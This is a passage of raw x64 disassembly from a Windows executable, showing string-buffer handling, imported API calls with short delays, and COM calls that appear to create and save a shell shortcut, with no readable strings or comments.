   140002ba1:	4c 89 7f 10          	mov    %r15,0x10(%rdi)
   140002ba5:	48 c7 47 18 07 00 00 	movq   $0x7,0x18(%rdi)
   140002bac:	00 
   140002bad:	66 44 89 3f          	mov    %r15w,(%rdi)
   140002bb1:	48 8d 15 08 c6 03 00 	lea    0x3c608(%rip),%rdx        # 0x14003f1c0
   140002bb8:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002bbd:	e8 de 3b 00 00       	call   0x1400067a0
   140002bc2:	4c 89 7d 10          	mov    %r15,0x10(%rbp)
   140002bc6:	4c 89 7d 20          	mov    %r15,0x20(%rbp)
   140002bca:	4c 89 7d 28          	mov    %r15,0x28(%rbp)
   140002bce:	0f 10 00             	movups (%rax),%xmm0
   140002bd1:	0f 11 45 10          	movups %xmm0,0x10(%rbp)
   140002bd5:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002bd9:	0f 11 4d 20          	movups %xmm1,0x20(%rbp)
   140002bdd:	4c 89 78 10          	mov    %r15,0x10(%rax)
   140002be1:	48 c7 40 18 07 00 00 	movq   $0x7,0x18(%rax)
   140002be8:	00 
   140002be9:	66 44 89 38          	mov    %r15w,(%rax)
   140002bed:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002bf2:	48 83 fa 08          	cmp    $0x8,%rdx
   140002bf6:	72 37                	jb     0x140002c2f
   140002bf8:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002bff:	00 
   140002c00:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140002c05:	48 8b c1             	mov    %rcx,%rax
   140002c08:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002c0f:	72 19                	jb     0x140002c2a
   140002c11:	48 83 c2 27          	add    $0x27,%rdx
   140002c15:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002c19:	48 2b c1             	sub    %rcx,%rax
   140002c1c:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140002c20:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002c24:	0f 87 9a 11 00 00    	ja     0x140003dc4
   140002c2a:	e8 31 72 00 00       	call   0x140009e60
   140002c2f:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   140002c34:	48 c7 44 24 48 07 00 	movq   $0x7,0x48(%rsp)
   140002c3b:	00 00 
   140002c3d:	66 44 89 7c 24 30    	mov    %r15w,0x30(%rsp)
   140002c43:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
   140002c47:	48 83 fa 08          	cmp    $0x8,%rdx
   140002c4b:	72 37                	jb     0x140002c84
   140002c4d:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002c54:	00 
   140002c55:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140002c5a:	48 8b c1             	mov    %rcx,%rax
   140002c5d:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002c64:	72 19                	jb     0x140002c7f
   140002c66:	48 83 c2 27          	add    $0x27,%rdx
   140002c6a:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002c6e:	48 2b c1             	sub    %rcx,%rax
   140002c71:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140002c75:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002c79:	0f 87 4b 11 00 00    	ja     0x140003dca
   140002c7f:	e8 dc 71 00 00       	call   0x140009e60
   140002c84:	4c 89 7d 80          	mov    %r15,-0x80(%rbp)
   140002c88:	48 c7 45 88 07 00 00 	movq   $0x7,-0x78(%rbp)
   140002c8f:	00 
   140002c90:	66 44 89 7c 24 70    	mov    %r15w,0x70(%rsp)
   140002c96:	4c 8d 45 30          	lea    0x30(%rbp),%r8
   140002c9a:	48 83 7d 48 08       	cmpq   $0x8,0x48(%rbp)
   140002c9f:	4c 0f 43 45 30       	cmovae 0x30(%rbp),%r8
   140002ca4:	48 8d 15 21 c5 03 00 	lea    0x3c521(%rip),%rdx        # 0x14003f1cc
   140002cab:	48 8d 8d 10 1d 00 00 	lea    0x1d10(%rbp),%rcx
   140002cb2:	e8 79 42 00 00       	call   0x140006f30
   140002cb7:	45 33 c0             	xor    %r8d,%r8d
   140002cba:	48 8d 95 10 1d 00 00 	lea    0x1d10(%rbp),%rdx
   140002cc1:	48 8d 0d 10 c5 03 00 	lea    0x3c510(%rip),%rcx        # 0x14003f1d8
   140002cc8:	ff 15 ba d3 02 00    	call   *0x2d3ba(%rip)        # 0x140030088
   140002cce:	b9 f4 01 00 00       	mov    $0x1f4,%ecx
   140002cd3:	ff 15 7f d3 02 00    	call   *0x2d37f(%rip)        # 0x140030058
   140002cd9:	48 8d 0d f8 c4 03 00 	lea    0x3c4f8(%rip),%rcx        # 0x14003f1d8
   140002ce0:	ff 15 82 d3 02 00    	call   *0x2d382(%rip)        # 0x140030068
   140002ce6:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   140002cea:	48 83 bd 88 00 00 00 	cmpq   $0x8,0x88(%rbp)
   140002cf1:	08 
   140002cf2:	4c 0f 43 45 70       	cmovae 0x70(%rbp),%r8
   140002cf7:	48 8d 15 ce c4 03 00 	lea    0x3c4ce(%rip),%rdx        # 0x14003f1cc
   140002cfe:	48 8d 8d d0 14 00 00 	lea    0x14d0(%rbp),%rcx
   140002d05:	e8 26 42 00 00       	call   0x140006f30
   140002d0a:	45 33 c0             	xor    %r8d,%r8d
   140002d0d:	48 8d 95 d0 14 00 00 	lea    0x14d0(%rbp),%rdx
   140002d14:	48 8d 0d 05 c5 03 00 	lea    0x3c505(%rip),%rcx        # 0x14003f220
   140002d1b:	ff 15 67 d3 02 00    	call   *0x2d367(%rip)        # 0x140030088
   140002d21:	b9 f4 01 00 00       	mov    $0x1f4,%ecx
   140002d26:	ff 15 2c d3 02 00    	call   *0x2d32c(%rip)        # 0x140030058
   140002d2c:	48 8d 55 50          	lea    0x50(%rbp),%rdx
   140002d30:	48 83 7d 68 08       	cmpq   $0x8,0x68(%rbp)
   140002d35:	48 0f 43 55 50       	cmovae 0x50(%rbp),%rdx
   140002d3a:	45 33 c0             	xor    %r8d,%r8d
   140002d3d:	48 8d 0d 2c c5 03 00 	lea    0x3c52c(%rip),%rcx        # 0x14003f270
   140002d44:	ff 15 3e d3 02 00    	call   *0x2d33e(%rip)        # 0x140030088
   140002d4a:	4c 8d 45 10          	lea    0x10(%rbp),%r8
   140002d4e:	48 83 7d 28 08       	cmpq   $0x8,0x28(%rbp)
   140002d53:	4c 0f 43 45 10       	cmovae 0x10(%rbp),%r8
   140002d58:	48 8d 15 6d c4 03 00 	lea    0x3c46d(%rip),%rdx        # 0x14003f1cc
   140002d5f:	48 8d 8d 30 21 00 00 	lea    0x2130(%rbp),%rcx
   140002d66:	e8 d5 e3 ff ff       	call   0x140001140
   140002d6b:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140002d70:	48 83 7c 24 68 08    	cmpq   $0x8,0x68(%rsp)
   140002d76:	4c 0f 43 44 24 50    	cmovae 0x50(%rsp),%r8
   140002d7c:	48 8d 15 6d c5 03 00 	lea    0x3c56d(%rip),%rdx        # 0x14003f2f0
   140002d83:	48 8d 8d 20 1f 00 00 	lea    0x1f20(%rbp),%rcx
   140002d8a:	e8 a1 41 00 00       	call   0x140006f30
   140002d8f:	4c 89 bd 90 27 00 00 	mov    %r15,0x2790(%rbp)
   140002d96:	4c 89 bd 98 27 00 00 	mov    %r15,0x2798(%rbp)
   140002d9d:	33 c9                	xor    %ecx,%ecx
   140002d9f:	ff 15 3b d6 02 00    	call   *0x2d63b(%rip)        # 0x1400303e0
   140002da5:	48 8d 85 90 27 00 00 	lea    0x2790(%rbp),%rax
   140002dac:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002db1:	4c 8d 0d 48 d7 02 00 	lea    0x2d748(%rip),%r9        # 0x140030500
   140002db8:	33 d2                	xor    %edx,%edx
   140002dba:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140002dbe:	48 8d 0d 5b d7 02 00 	lea    0x2d75b(%rip),%rcx        # 0x140030520
   140002dc5:	ff 15 fd d5 02 00    	call   *0x2d5fd(%rip)        # 0x1400303c8
   140002dcb:	85 c0                	test   %eax,%eax
   140002dcd:	0f 88 92 00 00 00    	js     0x140002e65
   140002dd3:	48 8b 8d 90 27 00 00 	mov    0x2790(%rbp),%rcx
   140002dda:	48 8b 01             	mov    (%rcx),%rax
   140002ddd:	48 8d 95 d0 14 00 00 	lea    0x14d0(%rbp),%rdx
   140002de4:	ff 90 a0 00 00 00    	call   *0xa0(%rax)
   140002dea:	48 8b 8d 90 27 00 00 	mov    0x2790(%rbp),%rcx
   140002df1:	48 8b 01             	mov    (%rcx),%rax
   140002df4:	48 8d 95 20 1f 00 00 	lea    0x1f20(%rbp),%rdx
   140002dfb:	ff 50 58             	call   *0x58(%rax)
   140002dfe:	48 8b 8d 90 27 00 00 	mov    0x2790(%rbp),%rcx
   140002e05:	48 8b 01             	mov    (%rcx),%rax
   140002e08:	4c 8d 85 98 27 00 00 	lea    0x2798(%rbp),%r8
   140002e0f:	48 8d 15 fa d6 02 00 	lea    0x2d6fa(%rip),%rdx        # 0x140030510
   140002e16:	ff 10                	call   *(%rax)
   140002e18:	85 c0                	test   %eax,%eax
   140002e1a:	79 0f                	jns    0x140002e2b
   140002e1c:	48 8b 8d 90 27 00 00 	mov    0x2790(%rbp),%rcx
   140002e23:	48 8b 01             	mov    (%rcx),%rax
   140002e26:	ff 50 10             	call   *0x10(%rax)
   140002e29:	eb 3a                	jmp    0x140002e65
   140002e2b:	48 8b 8d 98 27 00 00 	mov    0x2798(%rbp),%rcx
   140002e32:	48 8b 01             	mov    (%rcx),%rax
   140002e35:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002e3b:	48 8d 95 30 21 00 00 	lea    0x2130(%rbp),%rdx
   140002e42:	ff 50 30             	call   *0x30(%rax)
   140002e45:	48 8b 8d 90 27 00 00 	mov    0x2790(%rbp),%rcx
   140002e4c:	48 8b 01             	mov    (%rcx),%rax
   140002e4f:	ff 50 10             	call   *0x10(%rax)
   140002e52:	48 8b 8d 98 27 00 00 	mov    0x2798(%rbp),%rcx
   140002e59:	48 8b 01             	mov    (%rcx),%rax
   140002e5c:	ff 50 10             	call   *0x10(%rax)
   140002e5f:	ff 15 6b d5 02 00    	call   *0x2d56b(%rip)        # 0x1400303d0
   140002e65:	e8 a6 f6 ff ff       	call   0x140002510
   140002e6a:	4c 8b c8             	mov    %rax,%r9
   140002e6d:	4c 8d 85 50 04 00 00 	lea    0x450(%rbp),%r8
   140002e74:	48 8d 15 c5 c5 03 00 	lea    0x3c5c5(%rip),%rdx        # 0x14003f440
   140002e7b:	48 8d 8d 80 0a 00 00 	lea    0xa80(%rbp),%rcx
   140002e82:	e8 a9 40 00 00       	call   0x140006f30
   140002e87:	4c 8d 85 50 04 00 00 	lea    0x450(%rbp),%r8
   140002e8e:	48 8d 15 c3 c5 03 00 	lea    0x3c5c3(%rip),%rdx        # 0x14003f458
   140002e95:	48 8d 8d e0 16 00 00 	lea    0x16e0(%rbp),%rcx
   140002e9c:	e8 8f 40 00 00       	call   0x140006f30
   140002ea1:	45 33 c0             	xor    %r8d,%r8d
   140002ea4:	48 8d 95 80 0a 00 00 	lea    0xa80(%rbp),%rdx
   140002eab:	48 8d 0d 6e c3 03 00 	lea    0x3c36e(%rip),%rcx        # 0x14003f220
   140002eb2:	ff 15 d0 d1 02 00    	call   *0x2d1d0(%rip)        # 0x140030088
   140002eb8:	45 33 c0             	xor    %r8d,%r8d
   140002ebb:	48 8d 95 e0 16 00 00 	lea    0x16e0(%rbp),%rdx
   140002ec2:	48 8d 0d af c5 03 00 	lea    0x3c5af(%rip),%rcx        # 0x14003f478
   140002ec9:	ff 15 b9 d1 02 00    	call   *0x2d1b9(%rip)        # 0x140030088
   140002ecf:	45 33 c0             	xor    %r8d,%r8d
   140002ed2:	48 8d 15 d7 c5 03 00 	lea    0x3c5d7(%rip),%rdx        # 0x14003f4b0
   140002ed9:	48 8d 0d 28 c6 03 00 	lea    0x3c628(%rip),%rcx        # 0x14003f508
   140002ee0:	ff 15 a2 d1 02 00    	call   *0x2d1a2(%rip)        # 0x140030088
   140002ee6:	e8 25 f6 ff ff       	call   0x140002510
   140002eeb:	4c 89 7d d0          	mov    %r15,-0x30(%rbp)
   140002eef:	4c 89 7d e0          	mov    %r15,-0x20(%rbp)
   140002ef3:	48 c7 45 e8 07 00 00 	movq   $0x7,-0x18(%rbp)
   140002efa:	00 
   140002efb:	66 44 89 7d d0       	mov    %r15w,-0x30(%rbp)
   140002f00:	4c 8b c3             	mov    %rbx,%r8
   140002f03:	49 ff c0             	inc    %r8
   140002f06:	66 42 83 3c 40 00    	cmpw   $0x0,(%rax,%r8,2)
   140002f0c:	75 f5                	jne    0x140002f03
   140002f0e:	48 8b d0             	mov    %rax,%rdx
   140002f11:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140002f15:	e8 e6 36 00 00       	call   0x140006600
   140002f1a:	90                   	nop
   140002f1b:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   140002f1f:	48 83 7d e8 08       	cmpq   $0x8,-0x18(%rbp)
   140002f24:	4c 0f 43 4d d0       	cmovae -0x30(%rbp),%r9
   140002f29:	4c 8d 85 70 08 00 00 	lea    0x870(%rbp),%r8
   140002f30:	48 8d 15 11 c6 03 00 	lea    0x3c611(%rip),%rdx        # 0x14003f548
   140002f37:	48 8d 8d a0 0e 00 00 	lea    0xea0(%rbp),%rcx
   140002f3e:	e8 fd e1 ff ff       	call   0x140001140
   140002f43:	48 8d 15 16 c6 03 00 	lea    0x3c616(%rip),%rdx        # 0x14003f560
   140002f4a:	48 8d 8d 40 23 00 00 	lea    0x2340(%rbp),%rcx
   140002f51:	e8 ea e1 ff ff       	call   0x140001140
   140002f56:	4c 89 bd 90 27 00 00 	mov    %r15,0x2790(%rbp)
   140002f5d:	4c 89 bd 98 27 00 00 	mov    %r15,0x2798(%rbp)
   140002f64:	33 c9                	xor    %ecx,%ecx
   140002f66:	ff 15 74 d4 02 00    	call   *0x2d474(%rip)        # 0x1400303e0
   140002f6c:	48 8d 85 90 27 00 00 	lea    0x2790(%rbp),%rax
   140002f73:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002f78:	4c 8d 0d 81 d5 02 00 	lea    0x2d581(%rip),%r9        # 0x140030500
   140002f7f:	33 d2                	xor    %edx,%edx
   140002f81:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140002f85:	48 8d 0d 94 d5 02 00 	lea    0x2d594(%rip),%rcx        # 0x140030520
   140002f8c:	ff 15 36 d4 02 00    	call   *0x2d436(%rip)        # 0x1400303c8
   140002f92:	85 c0                	test   %eax,%eax
   140002f94:	0f 88 92 00 00 00    	js     0x14000302c
   140002f9a:	48 8b 8d 90 27 00 00 	mov    0x2790(%rbp),%rcx
   140002fa1:	48 8b 01             	mov    (%rcx),%rax
   140002fa4:	48 8d 95 80 0a 00 00 	lea    0xa80(%rbp),%rdx
   140002fab:	ff 90 a0 00 00 00    	call   *0xa0(%rax)
   140002fb1:	48 8b 8d 90 27 00 00 	mov    0x2790(%rbp),%rcx
   140002fb8:	48 8b 01             	mov    (%rcx),%rax
   140002fbb:	48 8d 95 40 23 00 00 	lea    0x2340(%rbp),%rdx
   140002fc2:	ff 50 58             	call   *0x58(%rax)
   140002fc5:	48 8b 8d 90 27 00 00 	mov    0x2790(%rbp),%rcx
   140002fcc:	48 8b 01             	mov    (%rcx),%rax
   140002fcf:	4c 8d 85 98 27 00 00 	lea    0x2798(%rbp),%r8
   140002fd6:	48 8d 15 33 d5 02 00 	lea    0x2d533(%rip),%rdx        # 0x140030510
   140002fdd:	ff 10                	call   *(%rax)
   140002fdf:	85 c0                	test   %eax,%eax
   140002fe1:	79 0f                	jns    0x140002ff2
   140002fe3:	48 8b 8d 90 27 00 00 	mov    0x2790(%rbp),%rcx
   140002fea:	48 8b 01             	mov    (%rcx),%rax
   140002fed:	ff 50 10             	call   *0x10(%rax)
   140002ff0:	eb 3a                	jmp    0x14000302c
   140002ff2:	48 8b 8d 98 27 00 00 	mov    0x2798(%rbp),%rcx
   140002ff9:	48 8b 01             	mov    (%rcx),%rax
   140002ffc:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003002:	48 8d 95 a0 0e 00 00 	lea    0xea0(%rbp),%rdx
   140003009:	ff 50 30             	call   *0x30(%rax)
   14000300c:	48 8b 8d 90 27 00 00 	mov    0x2790(%rbp),%rcx
   140003013:	48 8b 01             	mov    (%rcx),%rax
   140003016:	ff 50 10             	call   *0x10(%rax)
   140003019:	48 8b 8d 98 27 00 00 	mov    0x2798(%rbp),%rcx
   140003020:	48 8b 01             	mov    (%rcx),%rax
   140003023:	ff 50 10             	call   *0x10(%rax)
   140003026:	ff 15 a4 d3 02 00    	call   *0x2d3a4(%rip)        # 0x1400303d0
   14000302c:	e8 df f4 ff ff       	call   0x140002510
   140003031:	4c 89 7d b0          	mov    %r15,-0x50(%rbp)
   140003035:	4c 89 7d c0          	mov    %r15,-0x40(%rbp)
   140003039:	48 c7 45 c8 07 00 00 	movq   $0x7,-0x38(%rbp)
   140003040:	00 
   140003041:	66 44 89 7d b0       	mov    %r15w,-0x50(%rbp)
   140003046:	4c 8b c3             	mov    %rbx,%r8
   140003049:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140003050:	49 ff c0             	inc    %r8
   140003053:	66 42 83 3c 40 00    	cmpw   $0x0,(%rax,%r8,2)
   140003059:	75 f5                	jne    0x140003050
   14000305b:	48 8b d0             	mov    %rax,%rdx
   14000305e:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140003062:	e8 99 35 00 00       	call   0x140006600
   140003067:	90                   	nop
   140003068:	4c 8d 4d b0          	lea    -0x50(%rbp),%r9
   14000306c:	48 83 7d c8 08       	cmpq   $0x8,-0x38(%rbp)
   140003071:	4c 0f 43 4d b0       	cmovae -0x50(%rbp),%r9
   140003076:	4c 8d 85 50 04 00 00 	lea    0x450(%rbp),%r8
   14000307d:	48 8d 15 bc c3 03 00 	lea    0x3c3bc(%rip),%rdx        # 0x14003f440
   140003084:	48 8d 8d b0 10 00 00 	lea    0x10b0(%rbp),%rcx
   14000308b:	e8 a0 3e 00 00       	call   0x140006f30
   140003090:	45 33 c0             	xor    %r8d,%r8d
   140003093:	48 8d 95 b0 10 00 00 	lea    0x10b0(%rbp),%rdx
   14000309a:	48 8d 0d ef c4 03 00 	lea    0x3c4ef(%rip),%rcx        # 0x14003f590
   1400030a1:	ff 15 e1 cf 02 00    	call   *0x2cfe1(%rip)        # 0x140030088
   1400030a7:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400030ac:	ff 15 a6 cf 02 00    	call   *0x2cfa6(%rip)        # 0x140030058
   1400030b2:	4c 8d 4d b0          	lea    -0x50(%rbp),%r9
   1400030b6:	48 83 7d c8 08       	cmpq   $0x8,-0x38(%rbp)
   1400030bb:	4c 0f 43 4d b0       	cmovae -0x50(%rbp),%r9
   1400030c0:	4c 8d 85 50 04 00 00 	lea    0x450(%rbp),%r8
   1400030c7:	48 8d 15 0a c5 03 00 	lea    0x3c50a(%rip),%rdx        # 0x14003f5d8
   1400030ce:	48 8d 8d 90 0c 00 00 	lea    0xc90(%rbp),%rcx
   1400030d5:	e8 56 3e 00 00       	call   0x140006f30
   1400030da:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   1400030df:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   1400030e4:	48 c7 44 24 48 07 00 	movq   $0x7,0x48(%rsp)
   1400030eb:	00 00 
   1400030ed:	66 44 89 7c 24 30    	mov    %r15w,0x30(%rsp)
   1400030f3:	48 8d 85 70 08 00 00 	lea    0x870(%rbp),%rax
   1400030fa:	4c 8b c3             	mov    %rbx,%r8
   1400030fd:	0f 1f 00             	nopl   (%rax)
   140003100:	49 ff c0             	inc    %r8
   140003103:	66 42 83 3c 40 00    	cmpw   $0x0,(%rax,%r8,2)
   140003109:	75 f5                	jne    0x140003100
   14000310b:	48 8d 95 70 08 00 00 	lea    0x870(%rbp),%rdx
   140003112:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003117:	e8 e4 34 00 00       	call   0x140006600
   14000311c:	90                   	nop
   14000311d:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003122:	48 8d 8d b0 00 00 00 	lea    0xb0(%rbp),%rcx
   140003129:	e8 12 f0 ff ff       	call   0x140002140
   14000312e:	90                   	nop
   14000312f:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140003134:	48 83 fa 08          	cmp    $0x8,%rdx
   140003138:	72 37                	jb     0x140003171
   14000313a:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003141:	00 
   140003142:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003147:	48 8b c1             	mov    %rcx,%rax
   14000314a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003151:	72 19                	jb     0x14000316c
   140003153:	48 83 c2 27          	add    $0x27,%rdx
   140003157:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000315b:	48 2b c1             	sub    %rcx,%rax
   14000315e:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003162:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003166:	0f 87 64 0c 00 00    	ja     0x140003dd0
   14000316c:	e8 ef 6c 00 00       	call   0x140009e60
   140003171:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   140003176:	48 c7 44 24 48 07 00 	movq   $0x7,0x48(%rsp)
   14000317d:	00 00 
   14000317f:	66 44 89 7c 24 30    	mov    %r15w,0x30(%rsp)
   140003185:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   140003189:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   140003190:	e8 ab ef ff ff       	call   0x140002140
   140003195:	90                   	nop
   140003196:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   14000319b:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   1400031a0:	48 c7 44 24 48 07 00 	movq   $0x7,0x48(%rsp)
   1400031a7:	00 00 
   1400031a9:	66 44 89 7c 24 30    	mov    %r15w,0x30(%rsp)
   1400031af:	48 8d 85 90 0c 00 00 	lea    0xc90(%rbp),%rax
   1400031b6:	4c 8b c3             	mov    %rbx,%r8
   1400031b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400031c0:	49 ff c0             	inc    %r8
   1400031c3:	66 42 83 3c 40 00    	cmpw   $0x0,(%rax,%r8,2)
   1400031c9:	75 f5                	jne    0x1400031c0
   1400031cb:	48 8d 95 90 0c 00 00 	lea    0xc90(%rbp),%rdx
   1400031d2:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400031d7:	e8 24 34 00 00       	call   0x140006600
   1400031dc:	90                   	nop
   1400031dd:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400031e2:	48 8d 8d f0 00 00 00 	lea    0xf0(%rbp),%rcx
   1400031e9:	e8 42 f1 ff ff       	call   0x140002330
   1400031ee:	90                   	nop
   1400031ef:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1400031f4:	48 83 fa 08          	cmp    $0x8,%rdx
   1400031f8:	72 37                	jb     0x140003231
   1400031fa:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003201:	00 
   140003202:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140003207:	48 8b c1             	mov    %rcx,%rax
   14000320a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003211:	72 19                	jb     0x14000322c
   140003213:	48 83 c2 27          	add    $0x27,%rdx
   140003217:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000321b:	48 2b c1             	sub    %rcx,%rax
   14000321e:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140003222:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003226:	0f 87 aa 0b 00 00    	ja     0x140003dd6
   14000322c:	e8 2f 6c 00 00       	call   0x140009e60
   140003231:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   140003236:	48 c7 44 24 48 07 00 	movq   $0x7,0x48(%rsp)
   14000323d:	00 00 
   14000323f:	66 44 89 7c 24 30    	mov    %r15w,0x30(%rsp)
   140003245:	48 8d 95 f0 00 00 00 	lea    0xf0(%rbp),%rdx
   14000324c:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140003253:	e8 88 28 00 00       	call   0x140005ae0
   140003258:	90                   	nop
   140003259:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000325f:	48 8d 15 aa cc 03 00 	lea    0x3ccaa(%rip),%rdx        # 0x14003ff10
   140003266:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   14000326d:	e8 0e 2a 00 00       	call   0x140005c80
   140003272:	48 8d 15 77 c3 03 00 	lea    0x3c377(%rip),%rdx        # 0x14003f5f0
   140003279:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140003280:	e8 5b 3e 00 00       	call   0x1400070e0
   140003285:	48 8d 95 b0 00 00 00 	lea    0xb0(%rbp),%rdx
   14000328c:	48 83 bd c8 00 00 00 	cmpq   $0x10,0xc8(%rbp)
   140003293:	10 
   140003294:	48 0f 43 95 b0 00 00 	cmovae 0xb0(%rbp),%rdx
   14000329b:	00 
   14000329c:	4c 8b 85 c0 00 00 00 	mov    0xc0(%rbp),%r8
   1400032a3:	48 8b c8             	mov    %rax,%rcx
   1400032a6:	e8 95 4e 00 00       	call   0x140008140
   1400032ab:	48 8b c8             	mov    %rax,%rcx
   1400032ae:	48 8d 15 37 c3 03 00 	lea    0x3c337(%rip),%rdx        # 0x14003f5ec
   1400032b5:	e8 26 3e 00 00       	call   0x1400070e0
   1400032ba:	48 8d 15 3f c3 03 00 	lea    0x3c33f(%rip),%rdx        # 0x14003f600
   1400032c1:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   1400032c8:	e8 13 3e 00 00       	call   0x1400070e0
   1400032cd:	48 8d 15 74 c3 03 00 	lea    0x3c374(%rip),%rdx        # 0x14003f648
   1400032d4:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   1400032db:	e8 00 3e 00 00       	call   0x1400070e0
   1400032e0:	48 8d 95 90 00 00 00 	lea    0x90(%rbp),%rdx
   1400032e7:	48 83 bd a8 00 00 00 	cmpq   $0x10,0xa8(%rbp)
   1400032ee:	10 
   1400032ef:	48 0f 43 95 90 00 00 	cmovae 0x90(%rbp),%rdx
   1400032f6:	00 
   1400032f7:	4c 8b 85 a0 00 00 00 	mov    0xa0(%rbp),%r8
   1400032fe:	48 8b c8             	mov    %rax,%rcx
   140003301:	e8 3a 4e 00 00       	call   0x140008140
   140003306:	48 8b c8             	mov    %rax,%rcx
   140003309:	48 8d 15 28 c3 03 00 	lea    0x3c328(%rip),%rdx        # 0x14003f638
   140003310:	e8 cb 3d 00 00       	call   0x1400070e0
   140003315:	48 8d 15 44 c3 03 00 	lea    0x3c344(%rip),%rdx        # 0x14003f660
   14000331c:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140003323:	e8 b8 3d 00 00       	call   0x1400070e0
   140003328:	48 8d 15 79 c3 03 00 	lea    0x3c379(%rip),%rdx        # 0x14003f6a8
   14000332f:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140003336:	e8 a5 3d 00 00       	call   0x1400070e0
   14000333b:	48 8d 15 7e c3 03 00 	lea    0x3c37e(%rip),%rdx        # 0x14003f6c0
   140003342:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140003349:	e8 92 3d 00 00       	call   0x1400070e0
   14000334e:	48 8d 15 9b c3 03 00 	lea    0x3c39b(%rip),%rdx        # 0x14003f6f0
   140003355:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   14000335c:	e8 7f 3d 00 00       	call   0x1400070e0
   140003361:	48 8d 15 a0 c3 03 00 	lea    0x3c3a0(%rip),%rdx        # 0x14003f708
   140003368:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   14000336f:	e8 6c 3d 00 00       	call   0x1400070e0
   140003374:	48 8d 15 9d c3 03 00 	lea    0x3c39d(%rip),%rdx        # 0x14003f718
   14000337b:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140003382:	e8 59 3d 00 00       	call   0x1400070e0
   140003387:	48 8d 15 a2 c3 03 00 	lea    0x3c3a2(%rip),%rdx        # 0x14003f730
   14000338e:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   140003395:	e8 46 3d 00 00       	call   0x1400070e0
   14000339a:	48 8d 15 b7 c3 03 00 	lea    0x3c3b7(%rip),%rdx        # 0x14003f758
   1400033a1:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   1400033a8:	e8 33 3d 00 00       	call   0x1400070e0
   1400033ad:	48 8d 15 b4 c3 03 00 	lea    0x3c3b4(%rip),%rdx        # 0x14003f768
   1400033b4:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   1400033bb:	e8 20 3d 00 00       	call   0x1400070e0
   1400033c0:	48 8d 15 e9 c3 03 00 	lea    0x3c3e9(%rip),%rdx        # 0x14003f7b0
   1400033c7:	48 8d 8d 10 01 00 00 	lea    0x110(%rbp),%rcx
   1400033ce:	e8 0d 3d 00 00       	call   0x1400070e0
